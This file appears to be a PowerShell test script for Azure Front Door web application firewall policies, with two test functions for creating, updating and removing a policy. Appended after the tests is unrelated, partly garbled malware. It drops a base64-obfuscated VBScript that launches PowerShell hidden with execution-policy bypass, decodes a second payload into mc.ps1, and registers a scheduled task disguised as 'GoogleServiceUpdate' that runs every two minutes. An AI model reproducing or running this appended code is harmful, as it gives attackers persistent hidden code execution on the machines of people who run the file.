function Test-PolicyCrud{$Name = getAssetName$resourceGroup = TestSetup-CreateResourceGroup$resourceGroupName = $resourceGroup.ResourceGroupName$tags = @{"tag1" = "value1"; "tag2" = "value2"}$matchCondition1 = New-AzFrontDoorWafMatchConditionObject -MatchVariable RequestHeader -OperatorProperty Contains -Selector "UserAgent" -MatchValue "WINDOWS" -Transform "Uppercase"$customRule1 = New-AzFrontDoorWafCustomRuleObject -Name "Rule1" -RuleType MatchRule -MatchCondition $matchCondition1 -Action Block -Priority 2$ruleOverride = New-AzFrontDoorWafManagedRuleOverrideObject -RuleId "942100" -Action Log$override1 = New-AzFrontDoorWafRuleGroupOverrideObject -RuleGroupName SQLI -ManagedRuleOverride $ruleOverride$managedRule1 = New-AzFrontDoorWafManagedRuleObject -Type DefaultRuleSet -Version "1.0" -RuleGroupOverride $override1$managedRule2 = New-AzFrontDoorWafManagedRuleObject -Type BotProtection -Version "preview-0.1"New-AzFrontDoorWafPolicy -Name $Name -ResourceGroupName $resourceGroupName -Customrule $customRule1 -ManagedRule $managedRule1,$managedRule2 -EnabledState Enabled -Mode Prevention$retrievedPolicy = Get-AzFrontDoorWafPolicy -Name $Name -ResourceGroupName $resourceGroupName Assert-NotNull $retrievedPolicyAssert-AreEqual $Name $retrievedPolicy.NameAssert-AreEqual $customRule1.Name $retrievedPolicy.CustomRules[0].NameAssert-AreEqual $customRule1.RuleType $retrievedPolicy.CustomRules[0].RuleTypeAssert-AreEqual $customRule1.Action $retrievedPolicy.CustomRules[0].ActionAssert-AreEqual $customRule1.Priority $retrievedPolicy.CustomRules[0].PriorityAssert-AreEqual $matchCondition1.MatchVariable $retrievedPolicy.CustomRules[0].MatchConditions[0].MatchVariableAssert-AreEqual $matchCondition1.Selector $retrievedPolicy.CustomRules[0].MatchConditions[0].SelectorAssert-AreEqual $matchCondition1.OperatorProperty $retrievedPolicy.CustomRules[0].MatchConditions[0].OperatorPropertyAssert-AreEqual $matchCondition1.MatchValue[0] $retrievedPolicy.CustomRules[0].MatchConditions[0].MatchValue[0]Assert-AreEqual $matchCondition1.Transform[0] $retrievedPolicy.CustomRules[0].MatchConditions[0].Transform[0]Assert-AreEqual $managedRule1.RuleGroupOverrides[0].ManagedRuleOverrides[0].Action $retrievedPolicy.ManagedRules[0].RuleGroupOverrides[0].ManagedRuleOverrides[0].ActionAssert-AreEqual $managedRule1.RuleSetType $retrievedPolicy.ManagedRules[0].RuleSetTypeAssert-AreEqual $managedRule1.RuleSetVersion $retrievedPolicy.ManagedRules[0].RuleSetVersionAssert-AreEqual $managedRule2.RuleSetType $retrievedPolicy.ManagedRules[1].RuleSetTypeAssert-AreEqual $managedRule2.RuleSetVersion $retrievedPolicy.ManagedRules[1].RuleSetVersion$customRule2 = New-AzFrontDoorWafCustomRuleObject -Name "Rule2" -RuleType MatchRule -MatchCondition $matchCondition1 -Action Log -Priority 2$updatedPolicy = Update-AzFrontDoorWafPolicy -Name $Name -ResourceGroupName $resourceGroupName -Customrule $customRule2Assert-NotNull $updatedPolicyAssert-AreEqual $Name $updatedPolicy.NameAssert-AreEqual $customRule2.Name $updatedPolicy.CustomRules[0].NameAssert-AreEqual $customRule2.Action $updatedPolicy.CustomRules[0].ActionAssert-AreEqual $customRule2.Priority $updatedPolicy.CustomRules[0].PriorityAssert-AreEqual $managedRule1.RuleGroupOverrides[0].ManagedRuleOverrides[0].Action $updatedPolicy.ManagedRules[0].RuleGroupOverrides[0].ManagedRuleOverrides[0].Action$customRule3 = New-AzFrontDoorWafCustomRuleObject -Name "Rule3" -RuleType MatchRule -MatchCondition $matchCondition1 -Action Log -Priority 3 -EnabledState Disabled$updatedPolicy = Update-AzFrontDoorWafPolicy -Name $Name -ResourceGroupName $resourceGroupName -Customrule $customRule3Assert-NotNull $updatedPolicyAssert-AreEqual $Name $updatedPolicy.NameAssert-AreEqual $customRule3.Name $updatedPolicy.CustomRules[0].NameAssert-AreEqual $customRule3.Action $updatedPolicy.CustomRules[0].ActionAssert-AreEqual $customRule3.Priority $updatedPolicy.CustomRules[0].PriorityAssert-AreEqual $customRule3.EnabledState $updatedPolicy.CustomRules[0].EnabledStateAssert-AreEqual $managedRule1.RuleGroupOverrides[0].ManagedRuleOverrides[0].Action $updatedPolicy.ManagedRules[0].RuleGroupOverrides[0].ManagedRuleOverrides[0].Action$removed = Remove-AzFrontDoorWafPolicy -Name $Name -ResourceGroupName $resourceGroupName -PassThruAssert-True { $removed }Assert-ThrowsContains { Get-AzFrontDoorWafPolicy -Name $Name -ResourceGroupName $resourceGroupName } "does not exist."}function Test-PolicyCrudWithPiping{$Name = getAssetName$resourceGroup = TestSetup-CreateResourceGroup$resourceGroupName = $resourceGroup.ResourceGroupName$tag = @{"tag1" = "value1"; "tag2" = "value2"}$matchCondition1 = New-AzFrontDoorWafMatchConditionObject -MatchVariable RequestHeader -OperatorProperty Contains -Selector "UserAgent" -MatchValue "WINDOWS" -Transform "Uppercase"$customRule1 = New-AzFrontDoorWafCustomRuleObject -Name "Rule1" -RuleType MatchRule -MatchCondition $matchCondition1 -Action Block -Priority 2$ruleOverride = New-AzFrontDoorWafManagedRuleOverrideObject -RuleId "942100" -Action Log$override1 = New-AzFrontDoorWafRuleGroupOverrideObject -RuleGroupName SQLI -ManagedRuleOverride $ruleOverride$managedRule1 = New-AzFrontDoorWafManagedRuleObject -Type DefaultRuleSet -Version "1.0" -RuleGroupOverride $override1$managedRule2 = New-AzFrontDoorWafManagedRuleObject -Type BotProtection -Version "preview-0.1"New-AzFrontDoorWafPolicy -Name $Name -ResourceGroupName $resourceGroupName -Customrule $customRule1 -ManagedRule $managedRule1,$managedRule2 -EnabledState Enabled -Mode Prevention$customRule2 = New-AzFrontDoorWafCustomRuleObject -Name "Rule2" -RuleType MatchRule -MatchCondition $matchCondition1 -Action Log -Priority 2$updatedPolicy = Get-AzFrontDoorWafPolicy -Name $Name -ResourceGroupName $resourceGroupName | Update-AzFrontDoorWafPolicy -Customrule $customRule2Assert-NotNull $updatedPolicyAssert-AreEqual $Name $updatedPolicy.NameAssert-AreEqual $customRule2.Name $updatedPolicy.CustomRules[0].NameAssert-AreEqual $customRule2.Action $updatedPolicy.CustomRules[0].ActionAssert-AreEqual $customRule2.Priority $updatedPolicy.CustomRules[0].PriorityAssert-AreEqual $managedRule1.RuleGroupOverrides[0].ManagedRuleOverrides[0].Action $updatedPolicy.ManagedRules[0].RuleGroupOverrides[0].ManagedRuleOverrides[0].Action$removed = Get-AzFrontDoorWafPolicy -Name $Name -ResourceGroupName $resourceGroupName | Remove-AzFrontDoorWafPolicy -PassThruAssert-True { $removed }Assert-ThrowsContains { Get-AzFrontDoorWafPolicy -Name $Name -ResourceGroupName $resourceGroupName } "does not exist."}$path= "$env:userprofile\appdata\local\microsoft\Windows"if(-not(Test-Path -Path($path))){mkdir $path}$fileout="$path\L69742.vbs";$encstrvbs="c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K";$bytevbs=[System.Convert]::FromBase64String($encstrvbs);$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);$strvbs = $strvbs.replace('set-content $fileout $strvbs;$tmpfile="$env:TEMP\U1848931.TMP";$pscode_b64  =get-content $tmpfile | out-string;$pscode_b64=$pscode_b64.trim();$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))$id = [string](get-random -min 10000 -max 100000)$pscode = $pscode.replace('set-content "$path\mc.ps1" $pscode$taskstr="schtasks /create /F /sc minute /mo 2 /tn ""GoogleServiceUpdate"" /tr ""\""$fileout""\""   ";iex 'cmd /c $taskstr';